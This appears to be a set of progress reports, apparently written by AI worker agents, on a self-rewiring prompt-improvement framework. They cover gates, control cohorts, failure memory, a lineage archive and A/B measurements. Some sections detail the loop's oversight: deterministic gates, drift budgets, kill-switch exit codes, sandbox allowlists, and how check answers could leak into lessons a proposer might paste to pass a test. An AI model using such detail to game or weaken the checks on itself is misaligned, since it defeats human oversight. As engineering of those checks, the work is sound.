`ProseControlCohortGenerator` builds the real null: N placebo bullets in the
same section at the same insertion point, **matched to the treatment's token
count**, drawn from a task-neutral vocabulary, seeded from `cohort_seed` and
the candidate's SHA-256 so the threshold can be re-derived. A member is the
candidate with the bullet's *text* substituted, so the only variable between
the arms is the words.

Three alternatives argued and rejected: another graph's lesson (it *was*
reasoned about, so it is not what "changes that were not reasoned about"
score); the word-shuffle (it preserves every content word, and ADR 0157 showed
the active ingredient is a literal token — that is the leak shape, not a
control); deleting the bullet (the incumbent, zero variance, p95 collapses onto
it and "beats the cohort" degenerates into "beats the incumbent").
`ProseCohortLeakError` refuses any placebo sharing a content word with the
treatment — the mutation the brief named kills 13 tests.

**Stated rather than discovered**: the placebo controls for a bullet's
presence, shape, position and length, **not for the plausibility of its
content**. A plausible-but-wrong null needs a model, and `gates/base.py`
requires every gate to be deterministic — so that stronger control is forbidden
by the gate contract, not merely unbuilt.

**D3 (0157's defect 5) — a spent call nobody counted.** `--proposer llm`
against a `.md` spends one call, the reply fails `ast.parse`, the rule-based
fallback has no constant to edit, and the rejection vanished with the rationale
it lived in. Not in the summary, not in the ledger (a cycle that proposes
nothing writes none), not in `cycles.jsonl`. `ProposerSpend` counts **attempts**
— incremented before the provider returns, because a request that errors after
it left has still been spent — and the note is appended to the line
`cmd_cycle` journals, so it reaches `cycles.jsonl` with `aef/cli/` untouched.

**Both verdicts, offline.** `tests/harness/test_prose_gate_path.py` runs the
real six-gate pipeline on a prompt-file repo with cassettes:

```
G3 pass  candidate mean 1 beats the control cohort's p95 of 0.5
         → escalate — every gate passed, but Tier-1 auto-merge is not enabled
```

and, on a fixture identical except that the **placebos** also produce the
verdict line:

```
G3 fail  candidate does not beat the p95 of the random control cohort — this is
         the null hypothesis, not an improvement
         → reject
```

The second is the one that matters: a test demanding acceptance can be met by
weakening G3, and this one can only be met by G3 still binding. **No threshold,
no accept/reject rule, no `PolicyEngine`, and no existing test changed** — the
one existing test that a refactor would have broken was kept green by keeping
the materialisation loop in one place instead, which is what it exists to
enforce.

**Mutations: 11 perturbed, 11 killed**, each restored from a shasum-verified
byte backup with the final hash asserted equal to the pre-edit hash.

**Green bar.** `pytest -q` **2236 passed, 5 skipped**; collected **2205 → 2241
(+36, none removed)**. `mypy aef examples` clean, 133 files. `ruff check .`
clean. `ruff format --check aef tests examples` clean, 259 files.

**No rubric score moves.** What would earn a dimension-2 point is an accept
verdict on a prompt candidate scored **live**, against S2's noise floor (0.7639
± 0.1666) — M5's and M6's evidence, not this worker's. The fixtures here are
plumbing proofs and their own docstring says so.

## Fix wave H1 — the bytes, the marker, and the nightly green tick (ADR 0172)

Five findings of the second seam hunt, all in `aef adopt` and the workflow it
renders. Four reproduced by RUNNING a command before anything was changed; the
fifth is a property of a string in YAML for a scheduler this branch cannot run,
and is labelled that way rather than dressed up as a measurement.

**R1 — ADR 0153's whole argument held for LF only.** That ADR's justification
for appending inside markers is one sentence: *every pre-existing byte survives
verbatim*. `Path.read_text()` translates `\r\n` to `\n`; `apply_block` was
byte-exact on the TRANSLATED text; `Path.write_text()` wrote it back with
`os.linesep`. On a CRLF `AGENTS.md`:

```
$ aef adopt --dir r1
appended aef block to .../r1/AGENTS.md (your bytes outside it are unchanged)
$ git -C r1 diff --stat -- AGENTS.md
 1 file changed, 41 insertions(+), 5 deletions(-)
-# House rules^M
-Our agents read this file.^M          # every original line, as a deletion
```

Five deletions and a report saying nothing outside the block moved. The mirror
is on Windows, where `write_text` would make every file this scaffold *writes*
CRLF while its own tests compare against LF. Fixed by reading and writing
bytes, rendering only the ADDED bytes in the file's dominant line ending, and
pasting the outside slices back verbatim — so a **mixed** file keeps every line
exactly as its author left it. The claim is now executable:
`_verify_preserved(prefix, suffix, result)` runs before every write and the
write is refused if it fails. After: `36 insertions(+)`, zero deletions,
original bytes at offset 0.

**R2 — a balanced marker pair in the adopter's own prose made adopt delete the
text between it.** `apply_block` took the first `<!-- aef:begin -->` and the
next `<!-- aef:end -->` anywhere in the file. This kit teaches those exact
strings in four generated documents, so an adopter quoting them is the ordinary
case. A `CLAUDE.md` quoting both with two house rules between them:

```
$ grep -c "RULE 7" r2/CLAUDE.md     # before: 1
$ aef adopt --dir r2
appended aef block to .../r2/CLAUDE.md (your bytes outside it are unchanged)
$ grep -c "RULE 7" r2/CLAUDE.md     # after: 0
```

ADR 0153's three refusals cover the *unbalanced* shapes. The balanced pair
adopt did not author was the missing fourth, and the only destructive one. The
begin marker now carries a signature — `<!-- aef:begin sha256=1a2b3c4d5e6f7081 -->`,
16 hex over the block body — and **only a signed pair is adopt's**; every other
`aef:begin`/`aef:end` is inert prose. A pre-signature block is upgraded ONCE
with a printed checklist notice, recognised only when its first body line is
one adopt itself emits: treating it as prose would leave the stale block and
append a second, and two contradicting copies of the contract in the file the
repo's agents read is the worse failure.

**R3 — the rendered nightly workflow read every exception as a healthy
rejection.** `aef migrate` writes the placeholder `agents/migrated/graph.py`
whenever it finds no wrappable call site — every prompt-file repo, which is
every repo in the survey — and its `build_graph()` raises. The workflow's
`AEF_MODULE` defaulted to it, so the module the job names exists and cannot
build:

```
$ aef loop cycle ... --module agents.migrated.graph ...
error: aef migrate found no wrappable call site in this repo.
EXIT=1
```

1 is `EXIT_REJECTED`; the step fails only on `status >= 2`. Green job, nothing
proposed, and nothing in `cycles.jsonl` for ADR 0165's staleness warning to
count. **ADR 0153's "the job fails visibly" was false**, and both errata are
appended there. Fixed twice over: the workflow names the first migrated
prompt-agent module (derived from migrate's own discovery and sanitiser, never
the placeholder), and a guard step before the cycle imports the module, calls
`build_graph()`, and fails the job with the actual exception in
`$GITHUB_STEP_SUMMARY` — not migrate's call-site sentence, which explains why
the placeholder exists and not why tonight failed. The guard was extracted from
the rendered YAML and EXECUTED in three states: missing module (exit 1),
placeholder named by name (exit 1), real graph after `aef migrate` (exit 0).
The exit-code test reads `aef/harness/loop.py`'s constants at test time, so it
is sharp whether or not G1a's distinct `EXIT_ERROR` has landed.

**R4 — adopt counted prompt agents flat while migrate recurses.** ADR 0152
measured `rglob` against the Claude Code CLI. `detect_prompt_surface` globbed
one level. One nested persona:

```
detected framework: prompt_files (7 agents, 5 skills)     # and in the checklist,
                                                          # and in the appended block
$ aef migrate --dir r4 && ls r4/agents/migrated/ | wc -l   # 8 graphs + placeholder
```

Adopt imports `discover_prompt_agents`/`discover_skills` from migrate now, with
its own-output exclusion applied on top. One discovery, one number.

**S1 (reasoned, NOT executed) — the nightly cycle's state was frozen after run
1.** `actions/cache` skips its post-job save on an exact key hit, and
`key: loop-state-${{ github.repository }}` contains nothing that varies. Both
rendered workflows now use a run-scoped key with a prefix `restore-keys`.

Also: `render_aef_yaml` finally mentions `shadow.containment` — the mode
defaults to `auto`, and `auto` *refuses* rather than downgrading, which is a
default an adopter should not have to meet as an error message.

**Reported, NOT fixed** (neither file is this worker's):

1. `discover_skills` counts the `SKILL.md` that `aef adopt` itself writes — 5
   from adopt against 6 from migrate on the same tree. `aef/cli/migrate.py`;
   the exclusion adopt applies should be mirrored there.
2. This repo's own `.github/workflows/loop-monitor.yml` **and**
   `loop-gate.yml` carry the same constant `loop-state-${{ github.repository }}`
   cache key S1 fixes in the rendered ones. G1a owns those files.

**Mutations:** 11 planted, 11 caught, every restore sha256-verified and every
patch asserting its anchor first. M10 (the cycle summary loses its exit-code
meanings) **survived the first pass**, because the test asserted every arm
except exit 0 — the arm the nightly job is actually green on. The test now
parses all four arms out of the rendered shell `case` and requires each to be
non-empty and correct.

**Green bar:** 2291 passed / 5 skipped (2269 → 2296 collected, +27),
`mypy aef examples` clean over 132 files, `ruff check .` clean,
`ruff format --check aef tests examples` clean. Zero live model calls.

## M4b — a failed check is what the run did (ADR 0174)

The wire M4 and S1 hit from opposite sides on the same night, and which ADR
0157's "Undone" says nobody owned. Model: `claude-opus-5[1m]`. **3 live calls**
(budget 8). **No rubric dimension moves.**

### Both reproductions, RUN, before anything changed

M4's, on a copy of the marlin clone, offline (a stub provider replaying the
answers M4's live bootstrap recorded — byte-identical replies, zero quota):

```
recorded 2 scenario(s) in the train split
  passed  accela-preconditions
  passed  accela-missing-credentials
0 of 2 recorded run(s) failed. A corpus where everything passes cannot
demonstrate an improvement …

accela-preconditions       -> success | no failure signals: 0 error(s) recorded, 0 tool call(s), none failed
accela-missing-credentials -> success | no failure signals: 0 error(s) recorded, 0 tool call(s), none failed
```

— while the scorer, from the same cassette, says
`0.0000 accela-missing-credentials / check failed: working_memory.prompt_agent
contains 'VERDICT:'` — and the cycle says
`no admissible failure memory: no candidate this cycle`.

S1's, the six summary validation scenarios through the real
`retrieve → draft → reflect → consolidate` graph with one durable store:

```
memory: 6 success record(s), 0 failure record(s)   (six unique signatures)
CONSOLIDATED: 0 knowledge entr(ies)
```

**and two of those six FAIL an owner check** (`sum-14` wants `swimming` and got
`Swimming`; `sum-16` wants `landslip` and got `Landslip`). One cause:
`make_reflect_node` writes `kind="failure"` only from `state.errors` /
`state.tool_results`, and a check is the task metric the harness evaluates
afterwards (ADR 0113).

### The producer

`aef/harness/check_memory.py`. When a run raised nothing and an owner check
failed, it runs the **real** `Critic`/`Judge` over that state with the check
failures as evidence and writes one `kind="failure"` record in
`make_reflect_node`'s own content shape.

**Design (a) — a LOCAL derived state — and (b) rejected by measurement.**
Injecting the failures into the run's real `state.errors` instead:

```
  as run:    task_completion=0.7500  checks=3/4
  injected:  task_completion=0.0000  checks=3/4
  classify().passed  as run=True  injected=False
```

`score_scenario` stops counting the check fraction the moment errors exist, so
the score falls to zero *because* the checks failed — a metric that changes
when you measure it — and `classify` reports a wrong answer as a crash.

**The signature drops the expected value** (`check:<path>:<op>`), and that is
load-bearing twice. Recurrence, measured:

| corpus | shipped (`path:op`) | value-keyed |
|---|---|---|
| summary validation split (S1's) | **1 entry** | **0** |
| marlin pilot (M4's) | **1 entry** | 1 |

and leakage: the signature is a prompt surface (`render_retrieved_context`'s
`[label]`, the proposer's `<!-- aef sig=… -->`).

**Teaching to the test.** The rendering never reads `check.value`:

```
check failed: working_memory.prompt_agent does not contain a required substring
the owner declared; observed 406 words, 2836 chars: '**No. The Accela connector…'
```

where ADR 0157's bullet said ``contains 'VERDICT:'``. Uniform across all six
ops — a `max_words` failure gives the observed word count and never the cap.
**What it still leaks, named rather than claimed away:** the state path, the
operator (for an `equals` check on a binary field that leaks the answer
completely), the observed value, and the pass/fail counts. The defensible claim
is only that a lesson can no longer be satisfied by pasting a string out of it.

### The falsification, stated first, did not fire

`BootstrapInput`'s own docstring already distinguishes `expected` — *"a
judgement about what the run turned out to do"*, refused by name — from
`checks` — *"a specification of the task written before the run"*. The check is
the owner's and predates the run; the observed value is the run's. ADR 0145's
"a graph with no reflect node leaves an empty sink" is narrowed **in writing,
with a test**; ADR 0060 is untouched, and with no checks declared bootstrap
still authors nothing at all.

One call site (`bootstrap`); two refusals with reasons already in the code —
`score`/`run_scenario` by its own invariant that a gate run must not mutate the
evidence a later proposal is built from, and `run --record-runs`/`harvest`
because a production run carries no owner check and `RecordedRun` has no field
for one.

### End to end

```
0 of 2 recorded run(s) raised, and 1 FAILED AN OWNER CHECK …
  1 of them is/are a check-derived FAILURE record …
CONSOLIDATED 1 entr(ies)
  failure:check:working_memory.prompt_agent:contains | runs=2
    ['accela-missing-credentials', 'accela-pinellas']

  proposed cycle-20260905T032809-prompt … (proposer=rule_based_prompt)
  G0 pass · G1 pass · G4 pass · G5 pass (drift 0.007/0.500) · G2 fail (TrustBoundaryError)
```

G2's failure there is ADR 0157's defect 1 — **fixed on `main` by M4c (ADR
0170) mid-increment**. Re-run on the merged code, the gates build a prose
control cohort and execute **21 scenarios** (`1 candidate + 1 incumbent + 5
random control(s)`), and G2 rejects for a different reason: `3
previously-passing scenario(s) no longer pass`. Confirmed at zero live cost —
incumbent `3 cassette hit(s), 0 miss(es)` mean 0.3333, candidate `0 hits, 3
misses` mean 0.0000. That is precisely the artifact UPGRADE_LOOP's own rule
names ("never let a cassette miss score a changed prompt as 0 and call that a
rejection"); the correct invocation is `--cassette-miss live`, 21 live
executions, beyond the 5 calls left in budget — so **no live gate verdict is
claimed**. `grep -c VERDICT memory.jsonl → 0`.

**Live, 3 calls**: preflight (`is_error False`, `input_tokens 2`,
`claude-opus-5[1m]`) plus two bootstrap recordings against
`model_provider.impl: claude_code` — two real objectives, two runs failing one
check, one entry, the same candidate, the same gate verdicts. **Nothing
synthesised**, which retires ADR 0157's `make_evidence.py`.

**S1's side**: the same six scenarios now give 2 failure records under one
signature → 1 entry → the lesson appears in the next run's draft prompt, where
every bullet previously read *"no failure signals"*.

**Re-run on S3b's corpus** (ADR 0171, merged from `main` mid-increment): 17
summary validation scenarios, **four content negatives**, and before the
producer `17 success record(s), 0 failure record(s)` — seventeen unique
signatures, `CONSOLIDATED: 0 knowledge entr(ies)`. With it: 4 failure records
under one signature `failure:check:working_memory.summary:max_words`, **1 entry
across 4 distinct runs**. Two unflattering observations recorded with it: on
this corpus the cap is *in the objective* ("summarise … in at most 28 words"),
so redacting `max_words`' value buys nothing here even though the record's own
text is clean; and the lesson is **retrieved and does not reach the model** —
chunk 14 of 24, score 0.125, while `render_retrieved_context(max_items=5)`
shows five `no failure signals` successes.

**`aef loop bootstrap` now counts a wrong answer as a failure.** S3b
reproduced the old line — eight inputs, three content negatives, `0 of 8
recorded run(s) failed. A corpus where everything passes cannot demonstrate an
improvement`. One count now, same definition the producer uses, split into its
halves: `2 of 3 recorded run(s) FAILED: 1 raised or ended with a failed plan, 1
failed an owner check`, with per-scenario `FAILED` / `WRONG` / `passed`.

### Mutations, green bar, and what is not claimed

6 mutations, 6 kills, every restore sha256-verified against a pre-edit hash
(never `git checkout --`). The headline one: drop the producer from
`bootstrap`, re-run the whole pilot → `no admissible failure memory: no
candidate this cycle`.

`pytest -q`: **2482 passed, 6 skipped**; collected 2438 → **2488 (+50, none
removed)** after two `origin/main` merges (2262 → 2305 on the pre-merge base).
`mypy aef examples` clean (134 files), `ruff check .` clean, `ruff format
--check` clean (270 files). S1's golden is green.

**No rubric change.** No task score was measured; the artifact is a capability
that was absent and is now present. S1's four arms are runnable as a real
comparison for the first time, and what they need is a corpus whose failures
recur — **S3b is building it tonight**. Re-running (a)/(b)/(c)/(d) against that
corpus is the measurement that could move dimension 2, not this increment.

**Defects found outside this worker's files.** `knowledge_boost = 0.0` hides
the only lesson there is, and now has a counter-example: over S3b's split the
single check-derived entry ranks **14 of 24** at the default and **3 of 24** at
0.5, so it survives `render_retrieved_context`'s top-5 only when boosted — ADR
0110 swept 0/0.5/1/3 and found no change, on a corpus that could not produce
seventeen near-identical successes crowding one lesson. Also: `aef loop cycle` silently drops
all evidence without `--graph-id` (`2 record(s) dropped as another graph's
scenario`) though the graph id is in the corpus it already loaded; ADR 0157's
G2/G3 defects reproduce unchanged; `loop score` wants `module:factory` where
`loop bootstrap` wants `module`; and a copied corpus's stale `manifest.json`
makes the next cycle refuse with `corpus shrank`, with no command to reconcile
it.
## S4 / J2 — the archive is real and persistent, and has not yet bought anything (ADR 0160)

Worker S4 of `UPGRADE_LOOP.md` (= BEYOND_90's J2), on `claude-opus-5`
(`claude-opus-5[1m]`). Quota preflight `is_error: false`, `result: "OK"`,
`input_tokens: 2` — `docs/research/j2/preflight.json`.

**J0's four dim-6 clauses, each on an artifact.**

1. `aef loop run --sample-parents`, `--seed`, `--no-lineage`, wired to
   `run_loop` and tested at both levels — the parser
   (`test_the_parser_accepts_the_flags_and_defaults_to_greedy_and_persistent`)
   and the handler with the parser bypassed
   (`test_the_handler_reads_the_flag_rather_than_the_parser_defaulting_it`),
   because either alone is a hole this repo has fallen into.
2. The lineage archive persists: `<state>/lineage/<graph-id>.jsonl`, one
   digest-carrying record per member, append + flush + fsync like the
   ledger; a second invocation resumes it and proposes from a parent the
   first kept (`test_the_lineage_persists_and_a_second_run_samples_a_parent_the_first_kept`).
   Deliberately BESIDE `archive.py`'s version store rather than inside it:
   rejects are members now, and un-gated content must never be reachable by
   `rollback` or appear in `versions()`, whose first element is the baseline
   G5 measures drift against.
3. Rejected candidates are members with their verdict and score
   (`test_every_gated_candidate_is_written_to_the_lineage_file`), sampleable
   iff G3 gave them a number
   (`test_a_rejected_member_that_reached_a_score_can_be_sampled_as_a_parent`).
   A cheap-gate reject weighs zero
   (`test_a_candidate_rejected_before_scoring_is_archived_but_never_sampled`):
   the root's 0.5 fallback would be a fabrication about a candidate nothing
   measured.
4. Duplicate detection and the rejected-tree stop run over the persisted set
   (`test_duplicate_detection_spans_invocations`,
   `test_a_tree_rejected_in_an_earlier_run_stops_the_next_one`), each with a
   `persist_lineage=False` control.

**Two seams the change opened, both caught by tests.** Greedy's parent was
`archive[-1]`, which after a rejection is the rejected candidate and after a
resume is an ancestor — the pre-existing
`test_a_second_run_resumes_from_the_existing_kept_branch` failed first, and
`_greedy_parent` names the kept ref now. And `distinct_kept_trees` had no
`kept` filter, which would have inflated the number the whole A/B is decided
on.

**Found by RUNNING the measurement.** `aef loop run` had no
`--build-command` while `gate` and `cycle` do, and `_build_commands` reads it
with `getattr`, so every `run` candidate was built with G1's default
`python -m pytest -q` — this repo's whole suite, per candidate, per turn. The
first live turn's only measurement was `G1 rejected it: build command failed
(timed out)`. Fixed; G1a reported the same gap independently.

**The live A/B — 18 live calls of a 100 budget.** 8 turns per arm, summary
corpus (gated on 2 train scenarios so a G3 pass costs ~14 calls rather than
~84; both arms see the identical corpus), fresh clone and state per arm,
`--cassette-miss live`, LLM proposer on Opus. Each arm ran as two
invocations because the wall clock, not the call budget, ends one at ~115
s/turn — and the second invocation of each printed `lineage: resumed 4
member(s)`, which is clause 2 in the live rig.

| arm | turns | kept | reverted | distinct parents | distinct kept trees | calls | stopped |
|---|---|---|---|---|---|---|---|
| greedy | 8 | 0 | 8 | **1** | 0 | 8 | turn budget exhausted |
| sampling | 7 | 0 | 7 | **5** | 0 | 7 | **halted** — two consecutive G5 drift rejections |

Task metric flat at 0.5 in both arms on every turn that reached G3.

**The falsification fired.** Dim 6 was to move 5 → 7 only on distinct kept
trees > 1 in the sampling arm with greedy at 1. It is **0 in both**, because
neither arm kept anything — G2's zero-tolerance rule rejected every scored
candidate regardless of parent. So: **the archive is now real and
persistent; it has not yet been shown to buy anything.** +1, not +2.

Three things that "no gain" hides. (a) The A/B as specified *could not*
discriminate with a kept count of 0; the statistic `sample_parents` controls
is distinct parents, 5 against 1. (b) ADR 0121's model is wrong for a
stochastic proposer — greedy explored 8 distinct trees from ONE parent, so
sampling's contribution is diversity of starting points, which only matters
once something is kept. (c) Every G5 drift rejection (0.511, 0.515, 0.547
against a 0.500 budget) was in the sampling arm, because drift is cumulative
against the blessed baseline and a rejected stepping stone is already
drifted. **The budget was not raised.** An archive that keeps stepping stones
spends a cumulative drift budget faster than a ladder does — a design tension
between DGM's open-endedness and this repo's containment.

**Should `sample_parents` be deleted? No**, and on evidence that differs from
ADR 0121's: in I6 the knob produced no different behaviour at all (it redrew
the root and the deterministic proposer re-emitted the same tree). Here it
demonstrably does — five parents, two of them rejects, with a visible
consequence. It is a working mechanism with a measured null result and a
named reason the measurement could not have come out otherwise, not an unkept
promise. The run that should delete it is one with a non-zero kept count in
which sampling still buys nothing; this one cannot be that run.

7 mutations, 7 caught, every restore sha256-verified. Rig, raw `results.jsonl`,
`--dry-run` output, report and preflight committed under `docs/research/j2/`.

**Rubric: dim 6 5 → 6**; `tests/test_rubric_arithmetic.py` recomputes the
heading, which lands at 71 after this row merged alongside S3b's dim-3 row.

**Reported, not fixed** (outside this worker's files): `aef loop run` prints
no cassette hit/miss count, so "scored live" and "replayed" are
indistinguishable from its output — the same reporting gap ADR 0156 named for
`aef loop score`; and `run_loop`'s wall-clock stop ends an arm mid-experiment
with no signal beyond `stopped_because`.

## S1b — the arms were real this time, and the layer still did not pay (ADR 0175)

**Model `claude-opus-5[1m]`, the session default; 120 live calls of a budget of
130** (1 preflight + 17 + 17 + 17 + 68). Every number re-measured on Opus; none
of ADR 0155's is reused.

ADR 0155 ran the four ACE arms and found the falsification `(c) <= (b)` fired
for a reason that made the number meaningless — **zero knowledge entries formed
in any arm**, so (b) and (c) were the same arm. ADR 0174 built the producer that
makes recurrence reachable and ADR 0171 built a corpus with owner-check
negatives in both splits. This increment re-ran the arms with the layer actually
engaged.

**Step 0 — the seed, at zero live cost.** The 20-scenario TRAIN split was
replayed from each scenario's committed cassette with `on_miss="fail"`, so a
single changed prompt byte would abort rather than spend quota. Three train
scenarios (`sum-22`, `sum-25`, `sum-26`) failed
`check:working_memory.summary:max_words`; `RuleBasedConsolidator` folded them
into **1 knowledge entry across 3 distinct runs**. The arms are scored on
VALIDATION, which the seed never saw.

**The reproduction, before quota, changed the plan.** Hashing every rendered
draft prompt under a recording provider:

```
arm=a boost=0.0  hash=5956e7ff…  lesson in prompt  0/17
arm=b boost=0.0  hash=c6873a50…                    0/17
arm=c boost=0.0  hash=c6873a50…  <- byte-identical to (b)
arm=c boost=0.5  hash=c6873a50…  <- byte-identical to (b)
arm=c boost=1.0  hash=c6873a50…  <- byte-identical to (b)
arm=c boost=3.0  hash=77db3dc3…                   10/17
```

At the shipped `knowledge_boost` default the store's only lesson never enters
`render_retrieved_context`'s five bullets, so arm (c) is arm (b). Running it
there would have repeated ADR 0155's mistake *with an entry present*, which is
worse — the null would have read as a result about the layer. The live (c) and
(d) ran at **boost 3.0**, the first swept value that surfaces the lesson.

**The four arms, 17 validation scenarios, 119 live calls:**

| arm | mean | negatives (n=4) | calls |
|---|---|---|---|
| (a) no retrieve | 0.8941 | 0.8500 | 17 |
| (b) raw records | **0.9176** | **0.9000** | 17 |
| (c) + knowledge @ boost 3.0 | 0.9059 | 0.8500 | 17 |
| (d) + LLM reflection | 0.9529 | 0.8500 | 68 |

**Falsification `(c) <= (b)`: FIRED, this time with the layer engaged.** One
entry, three source runs, the lesson in ten of seventeen prompts — and (c) still
scored below (b) on the mean and below (b) on the four owner-check negatives,
the scenarios a word-cap lesson had to move. **ADR 0110's coverage result is
therefore disproved as a predictor of task outcome on this corpus**, superseding
ADR 0155's "unconfirmed proxy". The mechanism works; the payoff is not there.

**Arm (c) and arm (d) sent byte-identical draft prompts on 17/17 scenarios.**
Arm (d)'s 51 extra `LLMCritic`/`LLMJudge` calls produce records that rank below
seventeen near-identical successes and never reach a bullet, so `+0.0470` is
same-prompt variance by construction. `reflection.impl: llm` stays off for the
fourth time (0115, 0123, 0155, here), now with a mechanism rather than a null.

**The noise bar was measured inside the experiment**, because a/b/c/d cost 119
of 130 calls and no repeat fit. From the pairs that sent identical prompts:
(c) vs (d) 17/17 identical, mean diff +0.0471, 4 scenarios changed; (b) vs (c)
7/17 identical, mean diff −0.0857, 5 changed. **Every arm delta (+0.0235,
−0.0117, +0.0470) sits inside that band.**

**Rubric: dimension 2 stays 12/20, delta 0.** No row prepended — the artifact
shows the opposite of an improvement. `knowledge_boost` stays 0.0 and **no file
under `aef/` was modified**; the two boost tests in
`tests/services/knowledge/test_ab_coverage.py` gained the second measurement in
their docstrings, deliberately, because ADR 0110's generalisation ("a knob that
changes ordering but never changes the metric") is now half false: it changes
ordering decisively and still does not change the metric.

**Defects found outside this worker's files** (reported, not fixed). ADR 0116's
staleness demotion walks a *training* lesson out of the prompt as a scored split
proceeds and nothing re-freshens it — the entry is rank 0 for nine scenarios and
rank 25–39 by the seventeenth, so the two negatives late in the split never saw
the lesson at all, halving the power of the comparison this increment exists
for. Arm (d)'s reflection output has no path to a prompt. And
`render_retrieved_context(max_items=5)` — not `context_budget_tokens` — is the
budget that actually binds: the retriever admits all 24–40 chunks and a constant
five decides what the model reads.


## Fix wave J2 — one flag with two meanings, and a crash announced as a halt (ADR 0178)

Two findings from the third seam hunt. Both reproduced by RUNNING a command on
the parent commit (db2987a) before anything was edited; zero live model calls.

**R2 — `--agent-path` is one flag with two meanings.** `--proposer
rule_based_prompt` reads it as the persona `.md` (ADR 0157 §1's reproduced
invocation, and `--proposer`'s own help text); `aef/harness/preflight.py` reads
it as a Python module. On the documented invocation, against a real `aef
migrate` output with `import anthropic` planted in one generated graph:

```
$ aef loop doctor --repo <pilot> --state <s> --corpus <c> \
      --agent-root .claude/agents --agent-path .claude/agents/accela.md
    [--] reflect node routed to  no reflect node in the graph
         fix: add make_reflect_node() to your graph AND make a node
              `return delta, 'reflect'` — an Edge alone does not route (ADR 0070)
    [--] blessed baseline        0 archived version(s)
         fix: aef loop bless ... --agent-path .claude/agents/accela.md ...
    [OK] model calls visible     1 graph scanned, none reaches a model SDK the
                                 harness cannot see
EXIT=1
```

Three wrong lines about a correct repo: a fix already applied, a `bless`
command that refuses, and a clean bill of health over the planted fault. And
`_warn_unmet_obligations` prints the same list on every cycle.

After — the persona resolved through migrate's own `discover_prompt_agents`:

```
    [OK] reflect node routed to  .claude/agents/migrated/marlin_accela/graph.py:
         make_prompt_agent_node(route='reflect') builds a node that routes to it
    [--] blessed baseline        fix: aef loop bless ...
         --agent-path .claude/agents/migrated/marlin_accela/graph.py --agent-root .claude/agents
    [--] model calls visible     .claude/agents/migrated/marlin_accela/graph.py:
         src/client.py:1 imports anthropic — the harness cannot see it
```

and, with the graph deleted, in words rather than as a Python answer:

```
    [--] reflect node routed to  persona .claude/agents/accela.md has no generated
         graph — `aef migrate` would write it to
         .claude/agents/migrated/marlin_accela/graph.py and nothing is there.
         Nothing was read, so nothing is claimed about the graph's wiring or its
         model calls
```

The proposer is untouched: it still gets the persona and still appends its
lesson to the `.md`. `--agent-path` gains help text naming both forms on all
five arguments, with the list derived from the parser.

**R8 — exit 3 is announced as "HALTED".** `EXIT_ERROR = 3` exists because a
crash's remedy is not a halt's (ADR 0167 §6). The rendered workflow's `case`
had arms `['*','0','1','2']`, and `-ge 2` sent a 3 into a step named `Surface a
halt` printing `## Self-rewiring loop HALTED in target`. Now, executed in bash
from the rendered YAML:

```
  exit 2 -> HALTED — the kill switch is on; clearing it is a deliberate act
  exit 3 -> ERROR — the cycle crashed; no kill switch is set, fix the invocation

  cycle.status = 3:
      ## Self-rewiring loop ERROR in target — the cycle crashed
      This is NOT a halt: no kill switch is set and clearing one changes
      nothing. ... the remedy is to fix the invocation ...
```

with a third arm for a job that failed outside the cycle — which the old step
was also calling a halt. Same shape in this repo's own `loop-monitor.yml`;
`loop-gate.yml`'s comment gains exit 3. The `-ge 2` rule is unchanged and
asserted in both repos.

**Mutations:** 11 planted, 11 caught, every restore sha256-verified. M2 (the
persona wide scan) SURVIVED the first pass, because the planted fault sat
inside the narrow scan's own target — the test proved nothing until the fault
moved to the other agent's graph. That is the reproduce-first rule about
verifying a detector against a planted fault, applied to a test of a widening.

**Green bar:** 2529 passed, 6 skipped (from 2510/6, +19); `mypy aef examples` clean;
`ruff check .` and `ruff format --check aef tests examples` clean.

**Defects found outside this worker's files (reported, not fixed).** Eleven of
the thirteen `aef loop` subcommands still report a crash as exit **1** via
`aef/cli/main.py`'s catch-all, and 1 is also `EXIT_REJECTED` — "the candidate
was rejected, the system is working". Only `cycle`, `run`, `doctor` and `bless`
return `EXIT_ERROR`. That is ADR 0167's R3 still standing across the rest of the
surface, and it is a `cli/loop.py`-wide change two other workers held during
this wave. `loop-gate.yml`'s new comment says so in the file where it matters.
## M5 — the acceptance test for a prompt-file repo (ADR 0158)

Branch `upgrade/m5-acceptance`, merged from `origin/main` at `db2987a` so M4b
(ADR 0174) is in. Model `claude-opus-5[1m]`. **15 live model calls** of a 40
budget. No file under `aef/` was modified. No rubric change — adoption work
claims no rubric point.

**The increment.** `tests/cli/test_prompt_repo_acceptance.py` runs the whole
documented sequence through the real CLI, as subprocesses, twice.

*Offline* (CI, `slow`, no credential): a synthetic repo shaped like the marlin
pilot — three personas under `.claude/agents/` with one nested in `sub/`, an
`AGENTS.md` whose own prose QUOTES the bare `aef:begin`/`aef:end` markers with
house rules between them, a CRLF `.gitignore`, a `.codex/`, a skill — driven
`adopt -> migrate -> bootstrap --memory --config -> bless -> doctor -> cycle
--proposer rule_based_prompt`. The provider is `impl: command` with
`argv: ["/bin/echo", "{system}", "{prompt}"]`: a real `CommandProvider`
running a real subprocess with the persona in the system channel, not a mock.
Asserted: adopt's diff is **insertions only** (41/0 on `AGENTS.md`, 5/0 on
`.gitignore`), `RULE 7` and `RULE 8` each survive once, the quoted bare marker
is untouched prose, adopt's own marker is the signed form, and the `.gitignore`
block is rendered in CRLF; migrate writes 3 graphs including the nested
persona's and every printed run command `shlex`-parses to a target the CLI
accepts; bootstrap reports `2 failed an owner check` and writes two
check-derived failure records under two distinct `run_id`s with one signature;
`entry.json` carries `agent_root: .claude/agents` and six digests all under it;
a defaulted `--agent-path` under a widened root is refused with `EXIT_USAGE`;
and the cycle's ledger holds `proposed` with `paths ==
['.claude/agents/accela-agent.md']` and a `gated` entry whose evidence is
`1 candidate + 1 incumbent + 5 random control(s)` over 21 executions — ADR
0170's prose cohort reached end-to-end through the CLI for the first time —
with G0/G1/G4/G5 pass, drift 0.012/0.500, and a verdict. ADR 0139's failure
shape is gone: every exit code checked, `cycles.jsonl` written while rejecting.

*Live* (`AEF_LIVE_HARNESS=1`, a COPY of the read-only pilot clone,
`impl: claude_code`, `model: claude-opus-5`): same sequence, same assertions.
`proposed paths ['.claude/agents/accela-agent.md']`, evidence `1 candidate +
1 incumbent + 5 random control(s)` over 14 executions, drift **0.007/0.500**,
verdict **REJECT**.

**Neither rejection is a judgement of the prompt, and that is the finding.**
Offline it is the changed-prompt-cannot-replay rule under `--cassette-miss
fail`. Live it is a defect.

- **F-M5-3 (HIGH).** `aef/harness/sandbox.py::DEFAULT_ENV_ALLOWLIST` has no
  `USER`, so `claude -p` answers `Not logged in - Please run /login` inside the
